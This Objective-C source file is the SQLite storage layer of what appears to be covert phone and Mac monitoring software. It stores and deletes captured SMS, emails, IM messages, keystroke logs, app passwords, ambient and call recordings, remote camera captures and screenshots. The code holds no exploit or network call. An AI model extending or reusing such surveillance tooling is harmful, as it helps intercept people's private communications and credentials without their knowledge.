//
//  DatabaseOperationAssistant.m
//  FxSqLite
//
//  Created by Makara Khloth on 9/22/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DatabaseOperationAssistant.h"
#import "EventKeys.h"
#import "FxEvent.h"
#import "EventCount.h"
#import "EventResultSet.h"
#import "QueryCriteria.h"
#import "EventQueryPriority.h"
#import "RegularEventFetcher.h"
#import "ThumbnailEventFetcher.h"

#import "DatabaseManager.h"
#import "DatabaseSchema.h"
#import "DataAccessObject.h"
#import "DAOFactory.h"
#import "EventBaseDAO.h"
#import "RecipientDAO.h"
#import "AttachmentDAO.h"
#import "CallTagDAO.h"
#import "GPSTagDAO.h"
#import "DbHealthInfo.h"
#import "FxSqlString.h"
#import "DefSqlite.h"
#import "BookmarkDAO.h"
#import "IMConversationContactDAO.h"
#import "IMMessageAttachmentDAO.h"
#import "AppPasswordDAO.h"

#import "FxRecipient.h"
#import "FxRecipientWrapper.h"
#import "FxAttachment.h"
#import "FxAttachmentWrapper.h"
#import "EventBaseWrapper.h"
#import "FxCallTag.h"
#import "FxGPSTag.h"
#import "FxSmsEvent.h"
#import "FxMmsEvent.h"
#import "FxEmailEvent.h"
#import "MediaEvent.h"
#import "ThumbnailEvent.h"
#import "FxCallLogEvent.h"
#import "FxSystemEvent.h"
#import "FxIMEvent.h"
#import "FxBookmarkEvent.h"
#import "FxBookmarkWrapper.h"
#import "FxIMMessageEvent.h"
#import "FxIMConversationEvent.h"
#import "FxVoIPEvent.h"
#import "FxKeyLogEvent.h"
#import "FxPasswordEvent.h"
#import "FxFileTransferEvent.h"
#import "FxIMMacOSEvent.h"
#import "FxEmailMacOSEvent.h"
#import "FxScreenshotEvent.h"
#import "FxPrintJobEvent.h"
#import "FxAppScreenShotEvent.h"

#import "FxException.h"
#import "DefStd.h"
#import "DaemonPrivateHome.h"

#import <sqlite3.h>
#import <Foundation/NSPathUtilities.h>

const NSInteger kMaxReadWriteError	= 5;

@interface DatabaseOperationAssistant (private)

- (void) readDBHealthInfo;

- (void) doDeleteEvent: (EventKeys*) aEventKeys;
- (FxEvent*) doSelectActualMedia: (NSInteger) aPairId;
- (EventCount*) doCountEvent;
- (EventResultSet*) doSelectMediaThumbnailEvents: (QueryCriteria*) aCriteria;
- (EventResultSet*) doSelectRegularEvents: (QueryCriteria*) aCriteria;
- (EventResultSet*) doSelectMediaNoThumbnailEvents: (QueryCriteria*) aCriteria;
- (void) doInsert: (FxEvent*) aEvent;
- (void) doUpdateMediaThumbnailStatus: (NSInteger) aPairId withStatus: (BOOL) aStatus;

- (void) processTransactionException: (id) aException ofEventType: (FxEventType) aEventType andDBOperation: (DatabaseOp) aDBOp;

@end

@implementation DatabaseOperationAssistant

@synthesize mDbHealthInfo;

- (id) initWithDatabaseManager: (DatabaseManager*) aDBManager andEventQueryPriority: (EventQueryPriority*) aQueryPriority {
	if ((self = [super init])) {
		mDatabaseManager = aDBManager;
		mEventQueryPriority = aQueryPriority;
		[self readDBHealthInfo];
	}
	return (self);
}

- (void) readDBHealthInfo {
	NSString *path = [NSString stringWithFormat:@"%@erm/", [DaemonPrivateHome daemonPrivateHome]];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
	mDbHealthInfo = [[DbHealthInfo alloc] init];
	[mDbHealthInfo setMFileFullPath:[NSString stringWithFormat:@"%@fxevents.log", path]];
	DLog (@"Database health info path = %@", [mDbHealthInfo mFileFullPath])
	[mDbHealthInfo read];
}

- (void) deleteEvent: (EventKeys*) aEventKeys {
	[self doDeleteEvent:aEventKeys];
}

- (FxEvent*) actualMedia: (NSInteger) aPairId {
	return ([self doSelectActualMedia:aPairId]);
}

- (EventCount*) eventCount {
	return ([self doCountEvent]);
}

- (EventResultSet*) mediaThumbnailEvents: (QueryCriteria*) aCriteria {
	return ([self doSelectMediaThumbnailEvents:aCriteria]);
}

- (EventResultSet*) regularEvents: (QueryCriteria*) aCriteria {
	return ([self doSelectRegularEvents:aCriteria]);
}

- (EventResultSet*) mediaNoThumbnailEvents: (QueryCriteria*) aCriteria {
	return ([self doSelectMediaNoThumbnailEvents:aCriteria]);
}

- (void) insert: (FxEvent*) aEvent {
	[self doInsert:aEvent];
}

- (void) updateMediaThumbnailStatus: (NSInteger) aPairId withStatus: (BOOL) aStatus {
	[self doUpdateMediaThumbnailStatus:aPairId withStatus:aStatus];
}

- (NSInteger) countTotalEvent {
	NSInteger totalCount = 0;
	@try {
		EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
		totalCount = [eventBaseDAO totalEventCount];
		[eventBaseDAO release];
	}
	@catch (NSException* e) {
		DLog (@"Count event in database of event base table got NSException = %@", e);
		// Use kEventTypeMaxEventType for event base table
		[self processTransactionException:e ofEventType:kEventTypeMaxEventType andDBOperation:kDbOpRead];
	}
	@catch (FxException* e) {
		DLog (@"Count event in database of event base table got FxException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeMaxEventType andDBOperation:kDbOpRead];
	}
	@finally {
		
	}
	return (totalCount);
}

- (void) doDeleteEvent: (EventKeys*) aEventKeys {
	FxEventType eventType = kEventTypeUnknown;
	@try {
        NSFileManager *fileManager = [NSFileManager defaultManager];
		for (NSNumber* number in [aEventKeys eventTypeArray]) {
			eventType = (FxEventType)[number intValue];
			id <DataAccessObject> dao = [DAOFactory dataAccessObject:eventType withSqlite3:[mDatabaseManager sqlite3db]];
			NSArray* eventIdArray = [aEventKeys eventIdArray:eventType];
			for (NSNumber* eventId in eventIdArray) {
				// 1. Delete attachment files if any
				if (eventType == kEventTypeMms	||
					eventType == kEventTypeMail	||
                    eventType == kEventTypeEmailMacOS ||
					eventType == kEventTypeIM	) {
					AttachmentDAO *attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
					NSArray *attachments = [attDAO selectRow:[eventId intValue] andEventType:eventType];
					for (FxAttachmentWrapper *wrp in attachments) {
						if ([fileManager fileExistsAtPath:[[wrp attachment] fullPath]]) {
							[fileManager removeItemAtPath:[[wrp attachment] fullPath] error:nil];
						}
					}
					[attDAO release];
				} else if (eventType == kEventTypeCallRecordAudio	||
						   eventType == kEventTypeAmbientRecordAudio||
						   eventType == kEventTypeRemoteCameraImage ||
						   eventType == kEventTypeRemoteCameraVideo	) {
					// For these event types we send as no thumbnail thus delete actual file when sending is done
					MediaEvent *mediaEvent = (MediaEvent *)[dao selectEvent:[eventId intValue]];
                    if ([fileManager fileExistsAtPath:[mediaEvent fullPath]]) {
                        [fileManager removeItemAtPath:[mediaEvent fullPath] error:nil];
                    }
				} else if (eventType == kEventTypeIMMessage) {
					IMMessageAttachmentDAO *imMsgAttachmentDAO = [[IMMessageAttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
					NSArray *attWrappers = [imMsgAttachmentDAO selectRowWithIMMessageID:[eventId intValue]];
					for (FxAttachmentWrapper *wrp in attWrappers) {
						if ([fileManager fileExistsAtPath:[[wrp attachment] fullPath]]) {
							[fileManager removeItemAtPath:[[wrp attachment] fullPath] error:nil];
						}
					}
					[imMsgAttachmentDAO release];
				} else if (eventType == kEventTypeKeyLog) {
                    FxKeyLogEvent *keyLogEvent = (FxKeyLogEvent *)[dao selectEvent:[eventId intValue]];
                    if ([fileManager fileExistsAtPath:[keyLogEvent mScreenshotPath]]) {
                        [fileManager removeItemAtPath:[keyLogEvent mScreenshotPath] error:nil];
                    }
                } else if (eventType == kEventTypeIMMacOS) {
                    FxIMMacOSEvent *imMacOSEvent = (FxIMMacOSEvent *)[dao selectEvent:[eventId intValue]];
                    if ([fileManager fileExistsAtPath:[imMacOSEvent mSnapshotFilePath]]) {
                        [fileManager removeItemAtPath:[imMacOSEvent mSnapshotFilePath] error:nil];
                    }
                } else if (eventType == kEventTypeScreenRecordSnapshot) {
                    FxScreenshotEvent *screenshotEvent = (FxScreenshotEvent *)[dao selectEvent:[eventId intValue]];
                    if ([fileManager fileExistsAtPath:[screenshotEvent mScreenshotFilePath]]) {
                        [fileManager removeItemAtPath:[screenshotEvent mScreenshotFilePath] error:nil];
                    }
                } else if (eventType == kEventTypePrintJob) {
                    FxPrintJobEvent *printJobEvent = (FxPrintJobEvent *)[dao selectEvent:[eventId integerValue]];
                    if ([fileManager fileExistsAtPath:[printJobEvent mPathToData]]) {
                        [fileManager removeItemAtPath:[printJobEvent mPathToData] error:nil];
                    }
                } else if (eventType == kEventTypeAppScreenShot) {
                    FxAppScreenShotEvent *appScreenShotEvent = (FxAppScreenShotEvent *)[dao selectEvent:[eventId integerValue]];
                    if ([fileManager fileExistsAtPath:[appScreenShotEvent mScreenshotFilePath]]) {
                        [fileManager removeItemAtPath:[appScreenShotEvent mScreenshotFilePath] error:nil];
                    }
                }
				
				// 2. Delete event
				[dao deleteEvent:[eventId intValue]];
				
				// 3. Other like attachment, recipient, call tag, gps tag, bookmark records if there are any will be deleted by the triggers
				
				// 4. Delete event count reference in event base table
				EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteEventTypeIdEventBaseSql];
				[sqlString formatInt:eventType atIndex:0];
				[sqlString formatInt:[eventId intValue] atIndex:1];
				NSString* sqlStatement = [sqlString finalizeSqlString];
				[eventBaseDAO executeSql:sqlStatement];
				[sqlString release];
				[eventBaseDAO release];
			}
		}
	}
	@catch (NSException* e) {
		DLog (@"Delete event from database got NSException = %@", e);
		[self processTransactionException:e ofEventType:eventType andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Delete event from database got FxException = %@", e);
		[self processTransactionException:e ofEventType:eventType andDBOperation:kDbOpWrite];
	}
	@finally {
		
	}
}

- (FxEvent*) doSelectActualMedia: (NSInteger) aPairId {
	FxEvent* event = nil;
	@try {
		// kEventTypeCameraImage is representative to create media dao
		id <DataAccessObject3> dao = [DAOFactory dataAccessObject:kEventTypeCameraImage withSqlite3:[mDatabaseManager sqlite3db]];
		event = [dao selectEvent:aPairId];
	}
	@catch (NSException* e) {
		DLog (@"Select actual media got NSException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Select actual media got FxException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@finally {
		
	}
	return (event);
}

- (EventCount*) doCountEvent {
	EventCount* eventCount = nil;
	@try {
		EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
		eventCount = [eventBaseDAO countAllEvent];
		[eventBaseDAO release];
	}
	@catch (NSException* e) {
		DLog(@"Count all event from all tables got NSException = %@", e)
		// Use kEventTypeMaxEventType for event base table
		[self processTransactionException:e ofEventType:kEventTypeMaxEventType andDBOperation:kDbOpRead];
	}
	@catch (FxException* e) {
		DLog(@"Count all event from all tables got FxException; name = %@, reason = %@", [e excName], [e excReason])
		[self processTransactionException:e ofEventType:kEventTypeMaxEventType andDBOperation:kDbOpRead];
	}
	@finally {
		
	}
	return (eventCount);
}

- (EventResultSet*) doSelectMediaThumbnailEvents: (QueryCriteria*) aCriteria {
	EventResultSet* eventResultSet = nil;
	@try {
		eventResultSet = [[EventResultSet alloc] init];
		ThumbnailEventFetcher* thumbnailFetcher = [[ThumbnailEventFetcher alloc] initWithDBManager:mDatabaseManager withEventQueryPriority:mEventQueryPriority andQueryCriteria:aCriteria];
		[eventResultSet setMEventArray:[thumbnailFetcher fetchThumbnailEvent]];
		[thumbnailFetcher release];
		[eventResultSet autorelease];
	}
	@catch (NSException* e) {
		DLog (@"Delete thumbnail event from database got NSException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Delete thumbnail event from database got FxException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@finally {
		
	}
	return (eventResultSet);
}

- (EventResultSet*) doSelectRegularEvents: (QueryCriteria*) aCriteria {
	EventResultSet* eventResultSet = nil;
	NSNumber* eventType = nil;
	@try {
		eventResultSet = [[EventResultSet alloc] init];
		RegularEventFetcher* regularFetcher = [[RegularEventFetcher alloc] initWithDBManager:mDatabaseManager withEventQueryPriority:mEventQueryPriority andQueryCriteria:aCriteria];
		[eventResultSet setMEventArray:[regularFetcher fetchRegularEvent:&eventType]];
		[regularFetcher release];
		[eventResultSet autorelease];
	}
	@catch (NSException* e) {
		DLog (@"Select regular event from database got NSException = %@", e);
		FxEventType tableId = kEventTypeUnknown;
		if (eventType) {
		tableId = (FxEventType)[eventType intValue];
		}
		[self processTransactionException:e ofEventType:tableId andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Select regular event from database got FxException = %@", e);
		FxEventType tableId = kEventTypeUnknown;
		if (eventType) {
			tableId = (FxEventType)[eventType intValue];
		}
		[self processTransactionException:e ofEventType:tableId andDBOperation:kDbOpWrite];
	}
	@finally {
		[eventType release];
	}
	return (eventResultSet);
}

- (EventResultSet*) doSelectMediaNoThumbnailEvents: (QueryCriteria*) aCriteria {
	EventResultSet* eventResultSet = nil;
	@try {
		eventResultSet = [[EventResultSet alloc] init];
		ThumbnailEventFetcher* thumbnailFetcher = [[ThumbnailEventFetcher alloc] initWithDBManager:mDatabaseManager withEventQueryPriority:mEventQueryPriority andQueryCriteria:aCriteria];
		[eventResultSet setMEventArray:[thumbnailFetcher fetchMediaNoThumbnailEvent]];
		[thumbnailFetcher release];
		[eventResultSet autorelease];
	}
	@catch (NSException* e) {
		DLog (@"Select media no thumbnail event from database got NSException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Select media no thumbnail event from database got NSException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@finally {
		
	}
	return (eventResultSet);
}

- (void) doInsert: (FxEvent*) aEvent {
	DLog (@"event type %d", [aEvent eventType])
	FxEventDirection eventDirection = kEventDirectionUnknown;

	@try {
		id <DataAccessObject> dao = [DAOFactory dataAccessObject:[aEvent eventType] withSqlite3:[mDatabaseManager sqlite3db]];
		[dao insertEvent:aEvent];
		
		NSInteger lastInsertRowId = [mDatabaseManager lastInsertRowId];
		[aEvent setEventId:lastInsertRowId];
		DLog (@"On assign event id = %lu", (unsigned long)[aEvent eventId]);
		
		switch ([aEvent eventType]) {
			case kEventTypeSystem: {
				FxSystemEvent* event = (FxSystemEvent*)aEvent;
				eventDirection = [event direction];
			} break;
			case kEventTypeCallLog: {
				FxCallLogEvent* event = (FxCallLogEvent*)aEvent;
				eventDirection = [event direction];
			} break;
			case kEventTypeVoIP: {
				FxVoIPEvent *volIPEvent = (FxVoIPEvent *)aEvent;
				eventDirection = [volIPEvent mDirection];
			} break;
			// Insert recipient and attachment...
			case kEventTypeSms: {
				FxSmsEvent* event = (FxSmsEvent*)aEvent;
				eventDirection = [event direction];
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxRecipient* recipient in [event recipientArray]) {
					FxRecipientWrapper* recipWrapper = [[FxRecipientWrapper alloc] init];
					[recipWrapper setRecipient:recipient];
					[recipWrapper setSmsId:lastInsertRowId];
					[recipDAO insertRow:recipWrapper];
					[recipWrapper release];
				}
				[recipDAO release];
			} break;
			case kEventTypeMms: {
				FxMmsEvent* event = (FxMmsEvent*)aEvent;
				eventDirection = [event direction];
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxRecipient* recipient in [event recipientArray]) {
					FxRecipientWrapper* recipWrapper = [[FxRecipientWrapper alloc] init];
					[recipWrapper setRecipient:recipient];
					[recipWrapper setMmsId:lastInsertRowId];
					[recipDAO insertRow:recipWrapper];
					[recipWrapper release];
				}
				[recipDAO release];
				
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxAttachment* attachment in [event attachmentArray]) {
					FxAttachmentWrapper* attWrapper = [[FxAttachmentWrapper alloc] init];
					[attWrapper setMmsId:lastInsertRowId];
					[attWrapper setAttachment:attachment];
					[attDAO insertRow:attWrapper];
					[attWrapper release];
				}
				[attDAO release];
			} break;
			case kEventTypeMail: {
				FxEmailEvent* event = (FxEmailEvent*)aEvent;
				eventDirection = [event direction];
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxRecipient* recipient in [event recipientArray]) {
					FxRecipientWrapper* recipWrapper = [[FxRecipientWrapper alloc] init];
					[recipWrapper setRecipient:recipient];
					[recipWrapper setEmailId:lastInsertRowId];
					[recipDAO insertRow:recipWrapper];
					[recipWrapper release];
				}
				[recipDAO release];
				
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxAttachment* attachment in [event attachmentArray]) {
					FxAttachmentWrapper* attWrapper = [[FxAttachmentWrapper alloc] init];
					[attWrapper setEmailId:lastInsertRowId];
					[attWrapper setAttachment:attachment];
					[attDAO insertRow:attWrapper];
					[attWrapper release];
				}
				[attDAO release];
			} break;
			case kEventTypeIM: {
				FxIMEvent* event = (FxIMEvent*)aEvent;
				eventDirection = [event mDirection];
				RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxRecipient* participant in [event mParticipants]) {
					FxRecipientWrapper* recipWrapper = [[FxRecipientWrapper alloc] init];
					[recipWrapper setRecipient:participant];
					[recipWrapper setMIMID:lastInsertRowId];
					[recipDAO insertRow:recipWrapper];
					[recipWrapper release];
				}
				[recipDAO release];
				
				AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxAttachment* attachment in [event mAttachments]) {
					FxAttachmentWrapper* attWrapper = [[FxAttachmentWrapper alloc] init];
					[attWrapper setMIMID:lastInsertRowId];
					[attWrapper setAttachment:attachment];
					[attDAO insertRow:attWrapper];
					[attWrapper release];
				}
				[attDAO release];
			} break;
			case kEventTypeBookmark: {
				BookmarkDAO *bookmarkDAO = [[BookmarkDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				FxBookmarkEvent *bookmarkEvent = (FxBookmarkEvent *)aEvent;
				for (FxBookmark *bookmark in [bookmarkEvent bookmarks]) {
					FxBookmarkWrapper *bookmarkW = [[FxBookmarkWrapper alloc] init];
					[bookmarkW setMBookmark:bookmark];
					[bookmarkW setMBookmarksId:lastInsertRowId];
					[bookmarkDAO insertRow:bookmarkW];
					[bookmarkW release];
				}
				[bookmarkDAO release];
			} break;
			case kEventTypeIMMessage: {
				FxIMMessageEvent *imMessageEvent = (FxIMMessageEvent *)aEvent;
				eventDirection = [imMessageEvent mDirection];
				IMMessageAttachmentDAO *imMessageAttachmentDAO = [[IMMessageAttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (FxAttachment *attachment in [imMessageEvent mAttachments]) {
					FxAttachmentWrapper *att = [[FxAttachmentWrapper alloc] init];
					[att setAttachment:attachment];
					[att setMIMID:lastInsertRowId];
					[imMessageAttachmentDAO insertRow:att];
					[att release];
				}
				[imMessageAttachmentDAO release];
			} break;
			case kEventTypeIMConversation: {
				FxIMConversationEvent *imConvsEvent = (FxIMConversationEvent *)aEvent;
				IMConversationContactDAO *imConvsContactDAO = [[IMConversationContactDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				for (NSString *participant in [imConvsEvent mContactIDs]) {
					NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
					NSDictionary *rowInfo = [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithInteger:lastInsertRowId], @"im_conversation_id",
																					participant, @"im_conversation_contact_id", nil];
					[imConvsContactDAO insertRow:rowInfo];
					[pool release];
				}
				[imConvsContactDAO release];
			} break;
            case kEventTypePassword: {
                FxPasswordEvent *pwdEvent = (FxPasswordEvent *)aEvent;
                AppPasswordDAO *appPwdDAO = [[AppPasswordDAO alloc] initWithSQLite3:[mDatabaseManager sqlite3db]];
                for (FxAppPwd *appPwd in [pwdEvent mAppPwds]) {
                    [appPwd setMPasswordID:lastInsertRowId];
                    [appPwdDAO insertRow:appPwd];
                }
                [appPwdDAO release];
            } break;
            case kEventTypeFileTransfer: {
                FxFileTransferEvent *fileTransferEvent = (FxFileTransferEvent *)aEvent;
                eventDirection = [fileTransferEvent mDirection];
            } break;
            case kEventTypeEmailMacOS: {
                FxEmailMacOSEvent* event = (FxEmailMacOSEvent*)aEvent;
                eventDirection = [event mDirection];
                RecipientDAO* recipDAO = [[RecipientDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
                for (FxRecipient* recipient in [event mRecipients]) {
                    FxRecipientWrapper* recipWrapper = [[FxRecipientWrapper alloc] init];
                    [recipWrapper setRecipient:recipient];
                    [recipWrapper setEmailId:lastInsertRowId];
                    [recipDAO insertRow:recipWrapper];
                    [recipWrapper release];
                }
                [recipDAO release];
                
                AttachmentDAO* attDAO = [[AttachmentDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
                for (FxAttachment* attachment in [event mAttachments]) {
                    FxAttachmentWrapper* attWrapper = [[FxAttachmentWrapper alloc] init];
                    [attWrapper setEmailId:lastInsertRowId];
                    [attWrapper setAttachment:attachment];
                    [attDAO insertRow:attWrapper];
                    [attWrapper release];
                }
                [attDAO release];
            } break;
			// Insert call tag, gps tag and thumbnail...
			case kEventTypeCameraImage:
			case kEventTypeVideo:
			case kEventTypeAudio:
			case kEventTypeCallRecordAudio:
			case kEventTypePanicImage:
			case kEventTypeWallpaper:
			case kEventTypeAmbientRecordAudio:
			case kEventTypeRemoteCameraImage:
			case kEventTypeRemoteCameraVideo: {
				MediaEvent* event = (MediaEvent*)aEvent;
				// kEventTypeCameraImageThumbnail is representative to create thumbnail dao
				NSObject <DataAccessObject>* thDAO = [DAOFactory dataAccessObject:kEventTypeCameraImageThumbnail withSqlite3:[mDatabaseManager sqlite3db]];
				for (ThumbnailEvent* thumbnail in [event thumbnailEvents]) {
					[thumbnail setPairId:lastInsertRowId];
					[thDAO insertEvent:thumbnail];
				}
				
				GPSTagDAO* gpsTagDAO = [[GPSTagDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				FxGPSTag* gpsTag = [event mGPSTag];
				if (gpsTag) {
					[gpsTag setDbId:lastInsertRowId];
					[gpsTagDAO insertRow:gpsTag];
				}
				[gpsTagDAO release];
				
				CallTagDAO* callTagDAO = [[CallTagDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
				FxCallTag* callTag = [event mCallTag];
				if (callTag) {
					[callTag setDbId:lastInsertRowId];
					[callTagDAO insertRow:callTag];
				}
				[callTagDAO release];
			} break;
			default: {
			} break;
		}
		
		// Insert to event base table
		EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
		EventBaseWrapper* wrapper = [[EventBaseWrapper alloc] init];
		[wrapper setMEventId:lastInsertRowId];
		[wrapper setMEventType:[aEvent eventType]];
		[wrapper setMEventDirection:eventDirection];
		[eventBaseDAO insertRow:wrapper];
		[wrapper release];
		[eventBaseDAO release];
	}
	@catch (NSException* e) {
		DLog (@"Insert event into database got NSException = %@", e);
		[self processTransactionException:e ofEventType:[aEvent eventType] andDBOperation:kDbOpWrite];
		// Throw the exception to upper level
		@throw e;
	}
	@catch (FxException* e) {
		DLog (@"Insert event into database got FxException = %@", e);
		[self processTransactionException:e ofEventType:[aEvent eventType] andDBOperation:kDbOpWrite];
		// Throw the exception to upper level
		@throw e;
	}
	@finally {
		
	}
}

- (void) doUpdateMediaThumbnailStatus: (NSInteger) aPairId withStatus: (BOOL) aStatus {
	@try {
		// kEventTypeCameraImage is representative to create media dao
		id <DataAccessObject3> dao = [DAOFactory dataAccessObject:kEventTypeCameraImage withSqlite3:[mDatabaseManager sqlite3db]];
		id <DataAccessObject3> thDAO = [DAOFactory dataAccessObject:kEventTypeCameraImageThumbnail withSqlite3:[mDatabaseManager sqlite3db]];
		
		// 1. Delete thumbnail files if any
		NSFileManager *fm = [NSFileManager defaultManager];
		NSArray* thumbnailArray = [thDAO selectThumbnail:aPairId];
		for (ThumbnailEvent *tEvent in thumbnailArray) {
			if ([fm fileExistsAtPath:[tEvent fullPath]]) {
				[fm removeItemAtPath:[tEvent fullPath] error:nil];
			}
		}
		
		// 2. Update deliver status of thumbnail
		MediaEvent* event = (MediaEvent*)[dao selectEvent:aPairId];
		[dao updateMediaEvent:aPairId];
		
		// 3. Thumbnail records will be deleted by trigger
		
		// 4. Delete event count reference in event base table
		EventBaseDAO* eventBaseDAO = [[EventBaseDAO alloc] initWithSqlite3:[mDatabaseManager sqlite3db]];
		FxSqlString* sqlString = [[FxSqlString alloc] initWithSqlFormat:kDeleteEventTypeIdEventBaseSql];
		[sqlString formatInt:[event eventType] atIndex:0];
		[sqlString formatInt:aPairId atIndex:1];
		NSString* sqlStatement = [sqlString finalizeSqlString];
		[eventBaseDAO executeSql:sqlStatement];
		[sqlString release];
		[eventBaseDAO release];
	}
	@catch (NSException* e) {
		DLog (@"Update media event thumbnail status in database got NSException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@catch (FxException* e) {
		DLog (@"Update media event thumbnail status in database got FxException = %@", e);
		[self processTransactionException:e ofEventType:kEventTypeCameraImage andDBOperation:kDbOpWrite];
	}
	@finally {
		
	}
}

- (void) processTransactionException: (id) aException ofEventType: (FxEventType) aEventType andDBOperation: (DatabaseOp) aDBOp {
	DLog(@"Processing exception = %@, aEventType: %d, aDBOp: %d", aException, aEventType, aDBOp)
	[mDbHealthInfo setLastOpTableId:aEventType];
	[mDbHealthInfo setDbLastOp:aDBOp];
	NSInteger dbError = 0;
	NSString* dbExcepReason = nil;
	if ([aException isKindOfClass:[FxException class]]) {
		FxException* exception = aException;
		dbError = [exception errorCode];
		dbExcepReason = [NSString stringWithString:[exception excReason]];
	} else if ([aException isKindOfClass:[NSException class]]) {
		NSException* exception = aException;
		dbError = 0 ;
		dbExcepReason = [NSString stringWithString:[exception reason]];
	}
	DLog(@"Exception reason: %@", dbExcepReason)
	[mDbHealthInfo setDbLastError:dbError];
	[mDbHealthInfo setDbLastExceptionReason:dbExcepReason];
	NSNumber* index = nil;
	
	BOOL exist = [mDbHealthInfo isTableLogExist:aEventType getIndex:&index];
	if (exist) {
		DLog (@"mDbHealthInfo exists")
		TableHealthLog tableLog = [mDbHealthInfo tableLog:[index intValue]];

		//DLog (@"tableLog: %d, %d", tableLog.writeErrorCount, tableLog.readErrorCount)
		NSInteger tableErrCount = tableLog.readErrorCount + tableLog.writeErrorCount;
		//DLog (@"Error count %d", tableErrCount)
		if (tableErrCount > kMaxReadWriteError) {
			//DLog(@"Error count GREATHER THAN kMaxReadWriteError")
			[[mDatabaseManager databaseSchema] dropTable:aEventType];
			tableLog.dropTableCount++;
			tableLog.readErrorCount = 0;
			tableLog.writeErrorCount = 0;
		} else {
			//DLog(@"Error count LESS THAN kMaxReadWriteError")
			if (aDBOp == kDbOpWrite) {
				//DLog(@"Before write: %d", tableLog.writeErrorCount)
				tableLog.writeErrorCount++;
				//DLog(@"After write: %ld", (long)tableLog.writeErrorCount)
			} else {
				tableLog.readErrorCount++;
			}
		}
		[mDbHealthInfo replaceTableLog:tableLog atIndex:[index intValue]];
	} else {
		DLog(@"!!!! Create TableHealthLog")
		TableHealthLog tableLog = {0, 0, 0, 0};
		tableLog.dropTableCount = 0;
		tableLog.tableId = aEventType;
		if (aDBOp == kDbOpWrite) {
			tableLog.writeErrorCount = 1;
			tableLog.readErrorCount = 0;
			//DLog (@"After: writeErrroCount %d", tableLog.writeErrorCount)
			//DLog (@"After: readErrroCount %d", tableLog.readErrorCount)
		} else {
			tableLog.writeErrorCount = 0;
			tableLog.readErrorCount = 1;
			//DLog (@"After: writeErrroCount %d", tableLog.writeErrorCount)
			//DLog (@"After: readErrroCount %d", tableLog.readErrorCount)
		}
		[mDbHealthInfo addTableLog:tableLog];
	}
	[index release];
	[mDbHealthInfo save];
}

- (void) dealloc {
	[mDbHealthInfo release];
	[super dealloc];
}

@end
